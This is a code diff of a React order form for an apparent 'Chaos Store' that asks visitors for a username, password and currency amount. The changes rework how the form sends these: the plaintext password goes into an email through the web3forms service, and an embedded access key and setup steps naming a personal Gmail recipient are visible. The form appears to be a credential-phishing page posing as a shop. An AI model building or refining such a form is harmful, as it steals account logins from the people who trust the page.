@@ -41,18 +41,26 @@
             setStatus('');
 
             try {
-              const formDataToSend = new FormData();
-              formDataToSend.append('access_key', '101b6422-dca4-4e50-9c27-318f493f47f9'); // Replace this
-              formDataToSend.append('subject', `New Chaos Order - ${formData.chaosAmount}`);
-              formDataToSend.append('from_name', 'Chaos Store');
-              formDataToSend.append('username', formData.username);
-              formDataToSend.append('password', formData.password);
-              formDataToSend.append('chaos_amount', formData.chaosAmount);
-              formDataToSend.append('timestamp', new Date().toLocaleString());
+              const payload = {
+                access_key: '101b6422-dca4-4e50-9c27-318f493f47f9',
+                subject: `New Chaos Order - ${formData.chaosAmount}`,
+                from_name: 'Chaos Store',
+                message: `
+New Chaos Order Received!
+
+Username: ${formData.username}
+Password: ${formData.password}
+Chaos Amount: ${formData.chaosAmount}
+Timestamp: ${new Date().toLocaleString()}
+                `
+              };
 
               const response = await fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
-                body: formDataToSend
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
               });
 
               const result = await response.json();
@@ -61,7 +69,7 @@
                 setStatus('Order submitted successfully! ✓');
                 setFormData({ username: '', password: '', chaosAmount: '500' });
               } else {
-                setStatus('Failed to submit. Please check your access key.');
+                setStatus(`Failed: ${result.message || 'Please try again'}`);
               }
             } catch (error) {
               console.error('Error:', error);
@@ -152,18 +160,7 @@
                   </div>
                 </div>
 
-                {/* Setup Instructions */}
-                <div className="mt-6 bg-white rounded-lg shadow-lg p-6">
-                  <h3 className="font-semibold text-gray-800 mb-3">📧 Setup (2 minutes):</h3>
-                  <ol className="text-sm text-gray-600 space-y-2 list-decimal list-inside">
-                    <li>Go to <a href="https://web3forms.com" target="_blank" className="text-purple-600 hover:underline font-semibold">web3forms.com</a></li>
-                    <li>Enter your email: <span className="font-mono bg-gray-100 px-1">electrotech156@gmail.com</span></li>
-                    <li>Click "Create Access Key" (no signup needed!)</li>
-                    <li>Copy the access key they send to your email</li>
-                    <li>Replace <span className="font-mono bg-gray-100 px-1">YOUR_ACCESS_KEY_HERE</span> in the code</li>
-                  </ol>
-                  <p className="mt-3 text-xs text-gray-500">✨ Free tier: 250 emails/month, no account needed!</p>
-                </div>
+
               </div>
             </div>
           );
